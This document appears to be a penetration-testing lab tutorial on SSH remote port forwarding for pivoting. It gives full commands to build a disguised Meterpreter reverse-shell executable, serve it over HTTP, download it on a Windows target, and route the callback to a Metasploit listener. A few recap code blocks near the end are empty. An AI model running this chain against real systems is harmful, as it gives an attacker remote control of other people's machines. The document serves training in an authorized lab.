# Remote / Reverse Port Forwarding with SSH

## 1. Overview

**Remote port forwarding (`SSH -R`)** allows a service on the attack host to receive connections initiated from a remote network through an SSH pivot host.

It is useful when a target can connect to the pivot host but **cannot directly reach the attack host** because of network routing restrictions.

### Why Is Remote Port Forwarding Needed?

Consider the following network:

| Host | IP Address | Role |
|---|---|---|
| Attack Host | `10.10.15.5` | Attacker machine running Metasploit |
| Ubuntu Pivot Host | `10.129.15.50` / `172.16.5.129` | Connects the attack host to the internal network |
| Windows Target | `172.16.5.19` | Internal target with RDP enabled |

The Windows target can communicate with the internal network (`172.16.5.0/23`) but cannot directly reach the attack host's network (`10.10.x.x`).

Consequently, a reverse connection from Windows to the attack host will fail if the Windows machine has no valid route to the attack host.

**Solution:** Use the Ubuntu server as a pivot and establish an SSH remote port forward.

## 2. Remote Port Forwarding Concept

The traffic flow is:

```text
Windows Target
172.16.5.19
     |
     | Connects to 172.16.5.129:8080
     v
Ubuntu Pivot Host
172.16.5.129:8080
     |
     | SSH tunnel forwards traffic
     v
Attack Host
0.0.0.0:8000
     |
     v
Metasploit Listener
```

The Ubuntu server listens on port `8080` and forwards incoming connections through the SSH tunnel to the attack host's port `8000`, where Metasploit is listening.

### Key Takeaway

- **Local forwarding (`-L`):** Makes a remote service accessible through a port on the SSH client's side.
- **Remote forwarding (`-R`):** Makes a service on the SSH client's side accessible through a listening port on the SSH server's side.
- **Dynamic forwarding (`-D`):** Creates a SOCKS proxy for routing traffic through the SSH server.

## 3. Lab Procedure

### Step 1: Generate the Windows Payload

Use `msfvenom` to generate a Windows x64 Meterpreter HTTPS payload.

```bash
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=172.16.5.129 LPORT=8080 \
  -f exe -o backupscript.exe
```

**Important parameters:**

| Parameter | Description |
|---|---|
| `-p` | Specifies the payload |
| `windows/x64/meterpreter/reverse_https` | Windows x64 Meterpreter HTTPS payload |
| `LHOST` | IP address the payload connects to |
| `LPORT` | Port the payload connects to |
| `-f exe` | Generates a Windows executable |
| `-o backupscript.exe` | Specifies the output filename |

**Note:** `LHOST` is the Ubuntu pivot's internal IP because Windows can reach the pivot but cannot directly reach the attack host.

### Step 2: Configure the Metasploit Listener

Start Metasploit and configure the handler.

```text
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 8000
run
```

**Why use these settings?**

- `exploit/multi/handler` receives the incoming Meterpreter connection.
- `LHOST 0.0.0.0` binds the listener to all local IPv4 interfaces.
- `LPORT 8000` specifies the port receiving the forwarded traffic.

The listener must be running before the target initiates its connection.

### Step 3: Transfer the Payload to Ubuntu

Use SCP to transfer the executable to the pivot host.

```bash
scp backupscript.exe ubuntu@<PivotHostIP>:~/
```

Replace `<PivotHostIP>` with the Ubuntu server's reachable SSH address.

### Step 4: Start an HTTP Server on Ubuntu

On the Ubuntu pivot host, navigate to the directory containing the executable and run:

```bash
python3 -m http.server 8123
```

The HTTP server serves the payload on port `8123`.

### Step 5: Download the Payload on Windows

On the Windows target, use PowerShell:

```powershell
Invoke-WebRequest `
  -Uri "http://172.16.5.129:8123/backupscript.exe" `
  -OutFile "C:\backupscript.exe"
```

This downloads the executable from the Ubuntu pivot host to the Windows machine.

### Step 6: Establish SSH Remote Port Forwarding

From the attack host, connect to Ubuntu and configure remote forwarding:

```bash
ssh -R 172.16.5.129:8080:0.0.0.0:8000 \
  ubuntu@<PivotHostIP> -vN
```

**Command breakdown:**

| Option / Argument | Meaning |
|---|---|
| `ssh` | Starts an SSH connection |
| `-R` | Configures remote port forwarding |
| `172.16.5.129:8080` | Listening address and port on the Ubuntu server |
| `0.0.0.0:8000` | Destination address and port on the attack host |
| `-v` | Enables verbose SSH logging |
| `-N` | Does not execute a remote shell or command |
| `ubuntu@<PivotHostIP>` | SSH account and address of the pivot host |

**Important:** Keep the SSH connection running while the forwarding is needed.

The forwarding rule is:

```text
Ubuntu:8080  --->  Attack Host:8000
```

When Windows connects to `172.16.5.129:8080`, SSH transports that connection to the attack host's port `8000`.

### Step 7: Execute the Payload on Windows

In the authorized lab, execute the downloaded payload on the Windows target.

The expected connection flow is:

1. Windows connects to `172.16.5.129:8080`.
2. Ubuntu receives the connection.
3. SSH forwards the traffic through the established tunnel.
4. The attack host receives it on port `8000`.
5. Metasploit processes the connection and establishes the Meterpreter session.

## 4. Verify the Connection

### SSH Forwarding Logs

Verbose SSH output may include messages such as:

```text
client_request_forwarded_tcpip
connect_next: host 0.0.0.0 ([0.0.0.0]:8000) in progress
connected to 0.0.0.0 port 8000
```

These messages indicate that a connection arrived at the remote forwarding port and SSH attempted to connect to the configured destination.

### Metasploit Output

A successful connection may produce output similar to:

```text
[*] Started HTTPS reverse handler on https://0.0.0.0:8000
[*] Meterpreter session 1 opened
```

To interact with the session:

```text
sessions
sessions -i 1
```

Use the actual session ID displayed by Metasploit.

### Why Does the Connection Appear to Come from 127.0.0.1?

The SSH client on the attack host creates the connection to the local forwarding destination. Therefore, Metasploit may report the connection as originating from `127.0.0.1`.

This does **not** mean Windows itself is running on the attack host. It is a consequence of the SSH forwarding path.

## 5. Troubleshooting

| Problem | What to Check |
|---|---|
| Windows cannot download the payload | Verify the Ubuntu HTTP server is running and port `8123` is reachable. |
| SSH connection succeeds but forwarding fails | Check the remote listening address, port, and SSH forwarding permissions. |
| No connection reaches Metasploit | Verify the payload's `LHOST`/`LPORT`, the SSH tunnel, and the listener configuration. |
| Port `8080` is unavailable | Check whether another service is using the port or whether SSH cannot bind to the requested address. |
| Meterpreter session does not open | Check the handler payload matches the generated payload and inspect SSH and Metasploit logs. |
| SSH tunnel stops working | Check whether the SSH connection has disconnected. The forward normally exists only while that connection remains active. |


**Configure Metasploit**

```text

run
```

**Transfer payload**

```bash
scp backupscript.exe ubuntu@<PivotHostIP>:~/
```

**Start HTTP server**

```bash

```

**Download payload on Windows**

```powershell
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

**Create remote port forward**

```bash
ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@<PivotHostIP> -vN
```

### Remember These Three Ports

| Port | Purpose |
|---|---|
| `8123` | Temporary HTTP server used to transfer the payload |
| `8080` | Remote listening port on the Ubuntu pivot |
| `8000` | Metasploit listener port on the attack host |

### Exam Points to Remember

1. Remote port forwarding is useful when the internal target cannot directly reach the attack host.
2. The pivot host must be reachable by both the attack host and the internal target.
3. `ssh -R` creates a listening port on the SSH server side and forwards incoming connections to a destination reachable from the SSH client side.
4. The payload's callback address must be reachable from the Windows target; here, it is the Ubuntu pivot's internal IP.
5. The SSH tunnel and Metasploit listener must remain active.
6. A connection appearing as `127.0.0.1` in Metasploit can be normal when SSH forwards the connection locally.
7. Remote forwarding does not automatically create network routes between the two networks; it forwards connections for the configured port.

**Core concept:** Use `ssh -R` when a target can reach the pivot host but cannot directly reach the attack host, and you need connections arriving at the pivot to reach a service on the attack host.
